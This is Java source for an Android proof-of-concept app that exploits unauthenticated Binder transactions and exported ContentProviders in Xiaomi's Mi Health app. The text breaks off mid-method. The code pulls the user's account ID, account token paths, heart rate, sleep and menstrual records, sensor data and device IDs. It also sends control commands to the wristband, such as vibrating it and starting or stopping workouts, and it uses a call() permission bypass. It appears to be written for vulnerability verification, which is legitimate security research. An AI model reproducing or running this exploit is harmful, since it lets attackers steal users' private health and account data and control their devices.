package com.example.sportxms.poc;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.TimeZone;

/**
 * SportXmsService + ContentProvider 无鉴权动态验证 POC v3。
 *
 * v1: 4 个只读 transaction（设备信息泄露）。
 * v2: 全部 25 个 transaction（用户信息/数据监听/设备控制）。
 * v3: 新增 ContentProvider 攻击面验证：
 *   - DeviceProvider (content://com.mi.health.provider.device/status) — 无权限检查
 *   - DataContentProvider (content://com.mi.health.provider.main/*) — 11 个子 Provider
 *   - call() 方法 getCallingPackage()=null 绕过验证
 *
 * 所有常量均从反编译源码逐行核对。
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "SportXmsPOC";

    // ==================== 主接口常量 ====================

    private static final String DESCRIPTOR =
            "com.xiaomi.fitness.sport_xms.launch.ISportXmsApi";
    private static final String TARGET_PKG = "com.mi.health";
    private static final String TARGET_SERVICE =
            "com.xiaomi.fitness.sport_xms.SportXmsService";

    // ==================== ContentProvider 常量 ====================

    // DeviceProvider — exported=true, 无任何权限 (AndroidManifest.xml:376-380)
    private static final Uri URI_DEVICE_STATUS =
            Uri.parse("content://com.mi.health.provider.device/status");

    // DataContentProvider — exported=true, 无 Manifest 权限, 代码级 isPrivilegedPackage 鉴权
    private static final String DC_AUTHORITY = "com.mi.health.provider.main";
    private static final Uri URI_DC_BASE = Uri.parse("content://" + DC_AUTHORITY);

    // DataContentProvider 子路径 (v66.java:14-24)
    private static final String[][] DC_QUERY_PATHS = {
            // {path, description}
            {"account/isLogin",         "登录状态"},
            {"account/getToken",        "账户 Service Token"},
            {"heartrate/recent",        "最新心率"},
            {"sleep/record",            "睡眠记录"},
            {"sleep/report",            "睡眠报告"},
            {"activity/steps/brief",    "步数/卡路里"},
            {"activity/steps/timeline", "步数时间线"},
            {"activity/goals/step",     "运动目标"},
            {"reproductive/period/brief",           "经期摘要"},
            {"reproductive/period/latest_history_record", "最近经期记录"},
            {"firstaid/queryEmergencyEnter",        "急救医疗ID"},
            {"privacy",                 "隐私协议状态"},
    };

    // call() 方法的 URI 格式: content://authority/path#method
    // DataContentProvider.call() 第 163-188 行: getCallingPackage()=null 时跳过权限检查
    private static final String[][] DC_CALL_METHODS = {
            // {uri_with_fragment, description}
            {"content://com.mi.health.provider.main/account/isLogin#isLogin",           "account/isLogin#isLogin"},
            {"content://com.mi.health.provider.main/privacy#isPrivacyAgree",            "privacy#isPrivacyAgree"},
            {"content://com.mi.health.provider.main/privacy#getRegion",                 "privacy#getRegion"},
            {"content://com.mi.health.provider.main/sleep#is_sleep_tracing",            "sleep#is_sleep_tracing"},
            {"content://com.mi.health.provider.main/sleep#is_maybe_sleeping",           "sleep#is_maybe_sleeping"},
            {"content://com.mi.health.provider.main/reproductive/period/mens_has_profile#mens_has_profile", "period#mens_has_profile"},
    };

    // ==================== transaction 编号 (v5e.java:18-42) ====================

    // 运动控制类
    private static final int T_startSport                      = 1;
    private static final int T_pauseSport                       = 2;
    private static final int T_resumeSport                      = 3;
    private static final int T_finishSport                      = 4;
    private static final int T_restartSport                     = 5;
    private static final int T_abnormalChangeSportStateToFinish = 6;

    // 回调注册类
    private static final int T_setSportStateChangedListener          = 7;
    private static final int T_setSportXmsDataChangedListener        = 8;
    private static final int T_setSportXmsSensorDataChangedListener  = 9;
    private static final int T_setXiaomiUserInfoListener             = 10;
    private static final int T_setDeviceConnectedListener            = 12;

    // 只读查询类
    private static final int T_isDeviceConnected           = 11;
    private static final int T_getDeviceBattery            = 14;
    private static final int T_isSupportSomatosensoryGame  = 15;
    private static final int T_hasOngoingSport             = 16;
    private static final int T_isDeviceSporting            = 17;
    private static final int T_goToAidongCoursePaymentPage = 18;
    private static final int T_isOpenPaidFeatures          = 20;
    private static final int T_getDeviceInfo               = 23;

    // 回调查询类
    private static final int T_getAidongMemberExpireTimestamp = 19;
    private static final int T_getCurDeviceMode               = 21;
    private static final int T_switchCurDeviceMode            = 22;

    // 其他
    private static final int T_shake                          = 13;
    private static final int T_finishSportByType              = 24;
    private static final int T_setAidongCourseVipInfoListener = 25;

    // ==================== 回调接口描述符 ====================

    private static final String DESC_SportStateChanged  =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteSportXmsStateChangedListener";
    private static final String DESC_DataChanged =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteSportXmsDataChangedListener";
    private static final String DESC_SensorDataChanged =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteSportXmsSensorDataChangedListener";
    private static final String DESC_UserInfo =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteUserInfoListener";
    private static final String DESC_DeviceConnected =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteDeviceConnectedListener";
    private static final String DESC_IsDeviceSporting =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteIsDeviceSportingListener";
    private static final String DESC_AidongMember =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteAidongMemberListener";
    private static final String DESC_DeviceMode =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteDeviceModeListener";
    private static final String DESC_CourseVipInfo =
            "com.xiaomi.fitness.sport_xms.listener.IRemoteCourseVipInfoListener";

    // ==================== 运动类型常量 (from SportXmsApiImpl.java:377) ====================

    private static final int SPORT_TYPE_RUNNING  = 810;
    private static final int SPORT_TYPE_CYCLING  = 812;

    // ==================== UI ====================

    private TextView logView;
    private IBinder remoteBinder;
    private boolean bound = false;

    // ==================== 回调 Binder 桩 ====================

    /**
     * 用户信息回调桩 - 接收 UserInfo(name, icon, sex, account)。
     * onTransact code=1: 读取 Parcelable UserInfo (带 null 标记)。
     */
    private final Binder userInfoCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_UserInfo);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_UserInfo);
            }
            if (code == 1) {
                int hasData = data.readInt();
                if (hasData != 0) {
                    String name    = data.readString();
                    String icon    = data.readString();
                    String sex     = data.readString();
                    String account = data.readString();
                    logLine(">>> [用户信息回调] UserInfo 泄露:");
                    logLine("    name(用户名)    = " + name);
                    logLine("    icon(头像URL)   = " + icon);
                    logLine("    sex(性别)       = " + sex);
                    logLine("    account(账号ID) = " + account);
                    if (account != null && !account.isEmpty()) {
                        logLine("    >>> 小米账号ID 已泄露");
                    }
                }
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    /**
     * 运动状态变化回调桩 - 接收 onSportStarted/Restarted/Paused/Finished。
     * code=1: onSportStarted(int code, int startTime, int timeZone, int sportType)
     * code=2: onSportRestarted(int code)
     * code=3: onSportPaused(int code)
     * code=4: onSportFinished(int code, boolean valid)
     */
    private final Binder sportStateCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_SportStateChanged);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_SportStateChanged);
            }
            switch (code) {
                case 1:
                    int sc = data.readInt();
                    int startTime = data.readInt();
                    int tz = data.readInt();
                    int sportType = data.readInt();
                    logLine(">>> [运动状态回调] onSportStarted:");
                    logLine("    code=" + sc + " startTime=" + startTime +
                            " tz=" + tz + " sportType=" + sportType);
                    return true;
                case 2:
                    logLine(">>> [运动状态回调] onSportRestarted: code=" + data.readInt());
                    return true;
                case 3:
                    logLine(">>> [运动状态回调] onSportPaused: code=" + data.readInt());
                    return true;
                case 4:
                    int fc = data.readInt();
                    boolean valid = data.readInt() != 0;
                    logLine(">>> [运动状态回调] onSportFinished: code=" + fc + " valid=" + valid);
                    return true;
                default:
                    return super.onTransact(code, data, reply, flags);
            }
        }
    };

    /**
     * 运动数据变化回调桩 - 接收 PhoneData(dur, hr, cal)。
     * code=1: 读取 Parcelable PhoneData (带 null 标记)。
     */
    private final Binder dataChangedCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_DataChanged);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_DataChanged);
            }
            if (code == 1) {
                int hasData = data.readInt();
                if (hasData != 0) {
                    int dur = data.readInt();
                    int hr  = data.readInt();
                    int cal = data.readInt();
                    logLine(">>> [运动数据回调] PhoneData:");
                    logLine("    duration(时长)=" + dur + "s  heartRate(心率)=" + hr +
                            "  calorie(卡路里)=" + cal);
                }
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    /**
     * 传感器数据变化回调桩 - 接收 WearSensorData(accel, gyro)。
     * code=1: 读取 Parcelable WearSensorData (带 null 标记)。
     */
    private final Binder sensorDataCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_SensorDataChanged);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_SensorDataChanged);
            }
            if (code == 1) {
                int hasData = data.readInt();
                if (hasData != 0) {
                    logLine(">>> [传感器数据回调] WearSensorData 已接收 (传感器数据泄露)");
                    // WearSensorData contains List<SensorData> accel + gyro
                    // 完整解析需要读取 typed list，此处仅记录接收事实
                }
                reply.writeNoException();
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    /**
     * 设备连接状态回调桩。
     * code=1: onConnectStart(String did)
     * code=2: onConnectFailure(String did, int errorCode, int retryTimes)
     * code=3: onConnectSuccess(String did)
     * code=4: onDisconnect(String did)
     */
    private final Binder deviceConnectedCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_DeviceConnected);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_DeviceConnected);
            }
            switch (code) {
                case 1:
                    logLine(">>> [连接状态回调] onConnectStart: did=" + data.readString());
                    return true;
                case 2:
                    String did = data.readString();
                    int errCode = data.readInt();
                    int retry = data.readInt();
                    logLine(">>> [连接状态回调] onConnectFailure: did=" + did +
                            " errCode=" + errCode + " retry=" + retry);
                    return true;
                case 3:
                    logLine(">>> [连接状态回调] onConnectSuccess: did=" + data.readString());
                    return true;
                case 4:
                    logLine(">>> [连接状态回调] onDisconnect: did=" + data.readString());
                    return true;
                default:
                    return super.onTransact(code, data, reply, flags);
            }
        }
    };

    /**
     * 设备模式回调桩 (用于 getCurDeviceMode / switchCurDeviceMode)。
     * code=1: w5(int mode) - 成功返回模式
     * code=2: onError(int errorCode) - 错误
     */
    private final Binder deviceModeCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_DeviceMode);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_DeviceMode);
            }
            if (code == 1) {
                int mode = data.readInt();
                logLine(">>> [设备模式回调] getCurDeviceMode 成功: mode=" + mode);
                reply.writeNoException();
                return true;
            }
            if (code == 2) {
                int errorCode = data.readInt();
                logLine(">>> [设备模式回调] onError: errorCode=" + errorCode);
                reply.writeNoException();
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    /**
     * 设备运动状态回调桩 (用于 isDeviceSporting)。
     * code=1: E0(boolean sporting) - 同步调用需 writeNoException
     */
    private final Binder isDeviceSportingCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_IsDeviceSporting);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_IsDeviceSporting);
            }
            if (code == 1) {
                boolean sporting = data.readInt() != 0;
                logLine(">>> [设备运动状态回调] isDeviceSporting: " + sporting);
                reply.writeNoException();
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    /**
     * 爱动会员过期时间回调桩 (用于 getAidongMemberExpireTimestamp)。
     * code=1: k5(long timestamp) - oneway
     * code=2: onError() - oneway
     */
    private final Binder aidongMemberCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_AidongMember);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_AidongMember);
            }
            if (code == 1) {
                long ts = data.readLong();
                logLine(">>> [会员回调] getAidongMemberExpireTimestamp: " + ts);
                return true;
            }
            if (code == 2) {
                logLine(">>> [会员回调] getAidongMemberExpireTimestamp onError");
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    /**
     * 课程VIP信息回调桩 (用于 setAidongCourseVipInfoListener)。
     * code=1: b2(CourseVipInfo) - 读取 Parcelable (带 null 标记)
     */
    private final Binder courseVipInfoCallback = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            if (code == 1598968902) {
                reply.writeString(DESC_CourseVipInfo);
                return true;
            }
            if (code >= 1 && code <= 16777215) {
                data.enforceInterface(DESC_CourseVipInfo);
            }
            if (code == 1) {
                int hasData = data.readInt();
                if (hasData != 0) {
                    int active = data.readInt();
                    String expiredAt = data.readString();
                    logLine(">>> [VIP回调] CourseVipInfo:");
                    logLine("    active=" + active + "  expiredAt=" + expiredAt);
                }
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    // ==================== 生命周期 ====================

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        logView = findViewById(R.id.logView);

        // 绑定按钮事件
        findViewById(R.id.btnAutoReadonly).setOnClickListener(v -> runAutoReadonly());
        findViewById(R.id.btnDeviceQuery).setOnClickListener(v -> runDeviceQuery());
        findViewById(R.id.btnUserInfo).setOnClickListener(v -> runGetUserInfo());
        findViewById(R.id.btnVipInfo).setOnClickListener(v -> runGetVipInfo());
        findViewById(R.id.btnRegisterListeners).setOnClickListener(v -> runRegisterListeners());
        findViewById(R.id.btnClearListeners).setOnClickListener(v -> logView.setText(""));

        // ContentProvider 验证按钮
        findViewById(R.id.btnCpDevice).setOnClickListener(v -> testDeviceProvider());
        findViewById(R.id.btnCpDataQuery).setOnClickListener(v -> testDataContentProviderQuery());
        findViewById(R.id.btnCpCallBypass).setOnClickListener(v -> testCallBypass());
        findViewById(R.id.btnCpCallAll).setOnClickListener(v -> testCallAll());

        findViewById(R.id.btnShake).setOnClickListener(v -> confirmAndRun("触发设备振动",
                "将向小米手环发送振动指令 (transaction 13)，确认执行？", this::doShake));
        findViewById(R.id.btnSwitchMode).setOnClickListener(v -> confirmAndRun("切换佩戴模式",
                "将切换手环佩戴模式 (transaction 22)，确认执行？", this::doSwitchMode));
        findViewById(R.id.btnStartSport).setOnClickListener(v -> confirmAndRun("开始运动",
                "将向手环发送开始运动指令 (transaction 1)，确认执行？", this::doStartSport));
        findViewById(R.id.btnPauseSport).setOnClickListener(v -> confirmAndRun("暂停运动",
                "将向手环发送暂停运动指令 (transaction 2)，确认执行？", this::doPauseSport));
        findViewById(R.id.btnResumeSport).setOnClickListener(v -> confirmAndRun("恢复运动",
                "将向手环发送恢复运动指令 (transaction 3)，确认执行？", this::doResumeSport));
        findViewById(R.id.btnFinishSport).setOnClickListener(v -> confirmAndRun("结束运动",
                "将向手环发送结束运动指令 (transaction 24)，确认执行？", this::doFinishSport));
        findViewById(R.id.btnAbnormalFinish).setOnClickListener(v -> confirmAndRun("异常结束运动",
                "将向手环发送异常结束运动指令 (transaction 6)，确认执行？", this::doAbnormalFinish));
        findViewById(R.id.btnRebind).setOnClickListener(v -> doRebind());

        // 打印身份信息
        printSelfIdentity();
        printTargetIdentity();

        // 自动绑定
        doRebind();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unbindService(serviceConnection);
        } catch (Exception e) {
            // ignore
        }
    }

    // ==================== 绑定 ====================

    private void doRebind() {
        if (bound) {
            try {
                unbindService(serviceConnection);
            } catch (Exception e) {
                // ignore
            }
            bound = false;
        }
        logLine("========== 开始绑定 ==========");
        logLine("正在绑定 " + TARGET_PKG + "/" + TARGET_SERVICE);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(TARGET_PKG, TARGET_SERVICE));
        boolean bindResult = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
        logLine("bindService 返回: " + bindResult);
        if (!bindResult) {
            logLine("绑定失败，请检查目标应用是否安装");
        }
    }

    private final ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            bound = true;
            remoteBinder = binder;
            logLine("---------- 绑定成功 ----------");
            logLine("onServiceConnected 收到 Binder: " + binder);
            try {
                String descriptor = binder.getInterfaceDescriptor();
                logLine("Binder descriptor: " + descriptor);
                if (DESCRIPTOR.equals(descriptor)) {
                    logLine("描述符匹配: ISportXmsApi 确认");
                }
            } catch (Exception e) {
                logLine("获取 descriptor 失败: " + e.getMessage());
            }
            logLine("现在可点击下方按钮执行各验证项");
            logLine("");
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            bound = false;
            remoteBinder = null;
            logLine("服务断开: " + name);
        }

        @Override
        public void onBindingDied(ComponentName name) {
            logLine("Binding died: " + name);
        }

        @Override
        public void onNullBinding(ComponentName name) {
            logLine("onNullBinding: 服务返回 null Binder");
        }
    };

    // ==================== 验证：只读查询 (自动) ====================

    private void runAutoReadonly() {
        if (checkBinder()) return;
        logLine("===== 自动只读验证 =====");

        // transaction 11: isDeviceConnected()
        Boolean connected = callBoolNoParam(T_isDeviceConnected, "isDeviceConnected");
        if (connected != null) logLine("  isDeviceConnected = " + connected);

        // transaction 14: getDeviceBattery()
        String battery = callStringNoParam(T_getDeviceBattery, "getDeviceBattery");
        if (battery != null) logLine("  getDeviceBattery = \"" + battery + "\"");

        // transaction 16: hasOngoingSport()
        Boolean hasSport = callBoolNoParam(T_hasOngoingSport, "hasOngoingSport");
        if (hasSport != null) logLine("  hasOngoingSport = " + hasSport);

        // transaction 15: isSupportSomatosensoryGame()
        Boolean somato = callBoolNoParam(T_isSupportSomatosensoryGame, "isSupportSomatosensoryGame");
        if (somato != null) logLine("  isSupportSomatosensoryGame = " + somato);

        // transaction 20: isOpenPaidFeatures()
        Boolean paid = callBoolNoParam(T_isOpenPaidFeatures, "isOpenPaidFeatures");
        if (paid != null) logLine("  isOpenPaidFeatures = " + paid);

        // transaction 23: getDeviceInfo()
        callGetDeviceInfo();

        logLine("===== 只读验证完成 =====\n");
    }

    // ==================== 验证：设备查询 (回调查询) ====================

    private void runDeviceQuery() {
        if (checkBinder()) return;
        logLine("===== 设备查询验证 =====");

        // transaction 17: isDeviceSporting(callback)
        callWithCallback(T_isDeviceSporting, isDeviceSportingCallback, "isDeviceSporting");

        // transaction 21: getCurDeviceMode(callback)
        callWithCallback(T_getCurDeviceMode, deviceModeCallback, "getCurDeviceMode");

        logLine("===== 设备查询已发出，等待回调 =====\n");
    }

    // ==================== 验证：用户信息 ====================

    private void runGetUserInfo() {
        if (checkBinder()) return;
        logLine("===== 获取用户信息 =====");
        // transaction 10: setXiaomiUserInfoListener(callback)
        callWithCallback(T_setXiaomiUserInfoListener, userInfoCallback, "setXiaomiUserInfoListener");
        logLine("已注册用户信息回调，等待小米账号信息返回...");
        logLine("（如果用户已登录小米账号，将收到 UserInfo 泄露）\n");
    }

    private void runGetVipInfo() {
        if (checkBinder()) return;
        logLine("===== 获取会员/VIP信息 =====");
        // transaction 19: getAidongMemberExpireTimestamp(callback)
        callWithCallback(T_getAidongMemberExpireTimestamp, aidongMemberCallback,
                "getAidongMemberExpireTimestamp");
        // transaction 25: setAidongCourseVipInfoListener(callback)
        callWithCallback(T_setAidongCourseVipInfoListener, courseVipInfoCallback,
                "setAidongCourseVipInfoListener");
        logLine("已注册会员/VIP回调，等待返回...\n");
    }

    // ==================== 验证：数据监听注册 ====================

    private void runRegisterListeners() {
        if (checkBinder()) return;
        logLine("===== 注册数据监听回调 =====");

        // transaction 7: setSportStateChangedListener
        callWithCallback(T_setSportStateChangedListener, sportStateCallback,
                "setSportStateChangedListener");
        // transaction 8: setSportXmsDataChangedListener
        callWithCallback(T_setSportXmsDataChangedListener, dataChangedCallback,
                "setSportXmsDataChangedListener");
        // transaction 9: setSportXmsSensorDataChangedListener
        callWithCallback(T_setSportXmsSensorDataChangedListener, sensorDataCallback,
                "setSportXmsSensorDataChangedListener");
        // transaction 12: setDeviceConnectedListener
        callWithCallback(T_setDeviceConnectedListener, deviceConnectedCallback,
                "setDeviceConnectedListener");

        logLine("全部回调已注册:");
        logLine("  - 运动状态变化 (运动开始/暂停/恢复/结束)");
        logLine("  - 运动数据变化 (时长/心率/卡路里)");
        logLine("  - 传感器数据变化 (加速度计/陀螺仪)");
        logLine("  - 设备连接状态变化");
        logLine("当用户使用手环运动时，数据将自动回调到本应用\n");
    }

    // ==================== 验证：设备控制 ====================

    private void doShake() {
        if (checkBinder()) return;
        logLine("===== [控制] 触发设备振动 (transaction 13) =====");
        // shake(int vibrateLevel) — v5e.java:231
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(1); // vibrateLevel=1
            boolean ok = remoteBinder.transact(T_shake, data, reply, 0);
            logLine("  transact(13) 返回: " + ok);
            reply.readException();
            logLine("  >>> 振动指令已发送，无 SecurityException");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
        logLine("");
    }

    private void doSwitchMode() {
        if (checkBinder()) return;
        logLine("===== [控制] 切换佩戴模式 (transaction 22) =====");
        // switchCurDeviceMode(int mode, l3e listener) — v5e.java:270
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(0); // mode=0 (切换到默认模式)
            data.writeStrongBinder(deviceModeCallback);
            boolean ok = remoteBinder.transact(T_switchCurDeviceMode, data, reply, 0);
            logLine("  transact(22) 返回: " + ok);
            logLine("  >>> 模式切换指令已发送，等待回调确认");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
        logLine("");
    }

    private void doStartSport() {
        if (checkBinder()) return;
        logLine("===== [控制] 开始运动 (transaction 1) =====");
        // startSport(String did, SportXmsRequestData data) — v5e.java:181-183
        // SportXmsRequestData.writeToParcel: writeInt(timeStamp), writeInt(timeZone),
        //   writeInt(sportType), writeInt(sportState), writeInt(courseId)
        // Parcelable null 标记: writeInt(1) 表示非 null
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeString(null); // did=null (使用当前设备)
            // SportXmsRequestData (non-null)
            data.writeInt(1); // non-null marker
            int timeStamp = (int) (System.currentTimeMillis() / 1000);
            int timeZone = TimeZone.getDefault().getRawOffset() / 3600000;
            data.writeInt(timeStamp);   // timeStamp
            data.writeInt(timeZone);    // timeZone
            data.writeInt(SPORT_TYPE_RUNNING); // sportType=810 (跑步)
            data.writeInt(0);           // sportState=0 (初始)
            data.writeInt(0);           // courseId=0
            boolean ok = remoteBinder.transact(T_startSport, data, reply, 0);
            logLine("  transact(1) 返回: " + ok);
            reply.readException();
            logLine("  >>> 开始运动指令已发送，无 SecurityException");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
        logLine("");
    }

    private void doPauseSport() {
        if (checkBinder()) return;
        logLine("===== [控制] 暂停运动 (transaction 2) =====");
        // pauseSport(String did, int sportType) — v5e.java:186
        callSportControlWithStringInt(T_pauseSport, "pauseSport", SPORT_TYPE_RUNNING);
        logLine("");
    }

    private void doResumeSport() {
        if (checkBinder()) return;
        logLine("===== [控制] 恢复运动 (transaction 3) =====");
        // resumeSport(String did, int sportType) — v5e.java:189
        callSportControlWithStringInt(T_resumeSport, "resumeSport", SPORT_TYPE_RUNNING);
        logLine("");
    }

    private void doFinishSport() {
        if (checkBinder()) return;
        logLine("===== [控制] 结束运动 (transaction 24) =====");
        // finishSportByType(String did, int sportType) — v5e.java:278
        callSportControlWithStringInt(T_finishSportByType, "finishSportByType", SPORT_TYPE_RUNNING);
        logLine("");
    }

    private void doAbnormalFinish() {
        if (checkBinder()) return;
        logLine("===== [控制] 异常结束运动 (transaction 6) =====");
        // abnormalChangeSportStateToFinish() — v5e.java:202 (无参数)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            boolean ok = remoteBinder.transact(T_abnormalChangeSportStateToFinish, data, reply, 0);
            logLine("  transact(6) 返回: " + ok);
            reply.readException();
            logLine("  >>> 异常结束指令已发送，无 SecurityException");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
        logLine("");
    }

    // ==================== 通用 transaction 调用工具 ====================

    private boolean checkBinder() {
        if (remoteBinder == null || !bound) {
            logLine("错误: Binder 未连接，请先等待绑定成功或点击\"重新绑定\"");
            return true;
        }
        return false;
    }

    /**
     * 调用无参数、返回 boolean 的 transaction。
     */
    private Boolean callBoolNoParam(int code, String name) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            boolean ok = remoteBinder.transact(code, data, reply, 0);
            logLine("  transact(" + code + ") " + name + " 返回: " + ok);
            reply.readException();
            return reply.readInt() != 0;
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
            return null;
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            return null;
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /**
     * 调用无参数、返回 String 的 transaction。
     */
    private String callStringNoParam(int code, String name) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            boolean ok = remoteBinder.transact(code, data, reply, 0);
            logLine("  transact(" + code + ") " + name + " 返回: " + ok);
            reply.readException();
            return reply.readString();
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
            return null;
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            return null;
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /**
     * 调用带 IBinder 回调参数的 transaction。
     * onTransact 格式: writeInterfaceToken + writeStrongBinder(callback)
     */
    private void callWithCallback(int code, Binder callback, String name) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeStrongBinder(callback);
            boolean ok = remoteBinder.transact(code, data, reply, 0);
            logLine("  transact(" + code + ") " + name + " 返回: " + ok);
            try {
                reply.readException();
            } catch (Exception e) {
                // 部分回调注册 transaction 可能不写 exception
            }
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /**
     * 调用 (String did, int sportType) 格式的运动控制 transaction。
     * 用于 pauseSport(2) / resumeSport(3) / restartSport(5) / finishSportByType(24)。
     */
    private void callSportControlWithStringInt(int code, String name, int sportType) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeString(null); // did=null
            data.writeInt(sportType);
            boolean ok = remoteBinder.transact(code, data, reply, 0);
            logLine("  transact(" + code + ") " + name + " 返回: " + ok);
            reply.readException();
            logLine("  >>> 指令已发送，无 SecurityException");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage());
        } catch (Exception e) {
            logLine("  调用失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    /**
     * 调用 transaction 23: getDeviceInfo()。
     * 返回 DeviceInfo(name, model, did) — Parcelable 带 null 标记。
     */
    private void callGetDeviceInfo() {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            boolean ok = remoteBinder.transact(T_getDeviceInfo, data, reply, 0);
            logLine("  transact(23) getDeviceInfo 返回: " + ok);
            reply.readException();
            int hasData = reply.readInt();
            if (hasData != 0) {
                String name  = reply.readString();
                String model = reply.readString();
                String did   = reply.readString();
                logLine("  DeviceInfo: name=" + name + " model=" + model + " did=" + did);
                if (did != null && !did.isEmpty()) {
